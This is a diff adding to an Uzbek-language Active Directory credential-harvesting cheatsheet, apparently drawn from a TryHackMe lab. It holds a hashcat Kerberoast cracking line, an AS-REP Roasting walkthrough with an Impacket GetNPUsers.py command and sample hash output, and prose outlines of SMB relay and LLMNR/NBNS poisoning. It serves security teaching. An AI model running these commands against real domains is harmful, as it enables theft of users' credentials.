@@ -68,3 +68,88 @@ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
 **AS-REP Roasting** — bu hujum texnikasi bo‘lib, hujumchiga “Kerberos oldindan autentifikatsiyani talab qilinmasin” (Do not require Kerberos pre-authentication) parametri yoqilgan foydalanuvchilarning credential hashlarini olish imkonini beradi.
 
 Bu parametr eskirgan Kerberos autentifikatsiya usuliga asoslangan bo‘lib, parol talab qilinmasdan chipta beriladi. Hujumchi ushbu hashni olib, oflayn tarzda crack qilishi mumkin. Agar hash crack qilinsa — foydalanuvchi paroli aniqlanadi!
+
+
+![](https://github.com/akhatkulov/cheatsheets-for-windows/blob/main/Credentials%20Harvesting/Other%20Attacks/Other%20Attacks.png?raw=true)
+
+
+VM (Virtual Mashina) ichida **“Do not require Kerberos preauthentication”** parametri yoqilgan AD foydalanuvchilaridan biri mavjud. **AS-REP Roasting** hujumini bajarishdan oldin, foydalanuvchilar ro‘yxatini aniqlab olish kerak — bu esa enumeratsiya (foydalanuvchilarni aniqlash) bosqichida amalga oshiriladi.
+
+Biz `users.lst` nomli faylni `/tmp` papkasi ichida yaratdik. Bu faylda quyidagi foydalanuvchilar mavjud:
+
+```
+Administrator  
+admin  
+thm  
+test  
+sshd  
+victim  
+CREDS-HARVESTIN$
+```
+
+---
+
+### **AS-REP Roasting Hujumini Bajarish**
+
+Endi esa **Impacket** paketidagi `GetNPUsers.py` skriptidan foydalanamiz:
+
+```bash
+python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.201.112.212 thm.red/ -usersfile /tmp/users.txt
+```
+
+> Bu yerda:
+>
+> * `-dc-ip` — Domain Controller'ning IP manzili.
+> * `thm.red/` — domen nomi.
+> * `-usersfile` — foydalanuvchilar ro‘yxati joylashgan fayl.
+
+Chiqarilgan natija quyidagicha bo‘lishi mumkin:
+
+```
+[-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set  
+$krb5asrep$23$victim@THM.RED:166c95418fb9dc495789fe9[...]1e8d2ef27$6a0e13abb5c99c07  
+[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set  
+[-] User bk-admin doesn't have UF_DONT_REQUIRE_PREAUTH set  
+[-] User svc-user doesn't have UF_DONT_REQUIRE_PREAUTH set  
+[-] User thm-local doesn't have UF_DONT_REQUIRE_PREAUTH set  
+```
+
+Faqatgina `victim` foydalanuvchisida **preauthentication** o‘chirilgan, shuning uchun uning hashini olish mumkin bo‘lgan ticket yaratildi.
+
+---
+
+Bu ticket'ni **Rubeus**, **John the Ripper**, yoki **Hashcat** yordamida crack qilish mumkin. `GetNPUsers.py` skriptida `-format` parametri orqali hash’ni kerakli formatda (John yoki Hashcat uchun) chiqarish ham mumkin.
+
+---
+
+### **SMB Relay Hujumi**
+
+**SMB Relay hujumi** — bu NTLM autentifikatsiya mexanizmini (ya’ni NTLM challenge-response protokolini) suiste’mol qiladigan hujumdir. Bu hujumda hujumchi **Man-in-the-Middle (MitM)** uslubidan foydalanadi — ya’ni tarmoqdagi SMB paketlarini tutadi va NTLM hashlarni qo‘lga kiritadi.
+
+> ⚠️ Hujum muvaffaqiyatli bo‘lishi uchun **SMB Signing** (imzolash) o‘chirilgan bo‘lishi shart.
+
+**SMB signing** — bu xavfsizlik tekshiruvi bo‘lib, aloqa ishonchli manbadan kelayotganini tasdiqlaydi.
+
+Bu hujum haqida batafsil ma’lumot olish uchun **THM Exploiting AD** (Active Directory hujumlari) xonasini ko‘rib chiqishingiz tavsiya qilinadi.
+
+---
+
+### **LLMNR/NBNS Poisoning (Zaharli Javoblar)**
+
+**LLMNR (Link-Local Multicast Name Resolution)** va **NBT-NS (NetBIOS Name Service)** — bu DNS ishlamay qolganda, mahalliy tarmoqdagi qurilmalar to‘g‘ri manzilni topishlari uchun ishlatiladi.
+
+Misol: Agar tarmoqdagi kompyuter DNS orqali boshqa kompyuter manzilini topa olmasa, u LLMNR yoki NBNS orqali “Shu kompyuterni bilasizmi?” degan multicast so‘rov yuboradi.
+
+**LLMNR/NBNS Poisoning** hujumi quyidagicha ishlaydi:
+
+* Hujumchi tarmoqda soxta (spoofed) manba sifatida o‘zini ko‘rsatadi.
+* DNS ishlamagan holatda yuborilgan LLMNR yoki NBNS so‘rovlariga o‘z javobini yuboradi.
+* Shu orqali autentifikatsiya uchun yuborilgan NTLM hash’larni qo‘lga kiritadi.
+
+Bu hujum haqida batafsil o‘rganish uchun **THM Breaching AD** (Active Directoryga kirish) xonasiga murojaat qilishingiz mumkin.
+
+---
+
+### **Xulosa**
+
+**SMB Relay** va **LLMNR/NBNS Poisoning** hujumlarining asosiy maqsadi — qurbonning NTLM hashlarini qo‘lga kiritishdir. Bu hashlar orqali esa foydalanuvchi hisoblariga yoki qurilmalarga kirish imkoni paydo bo‘ladi.
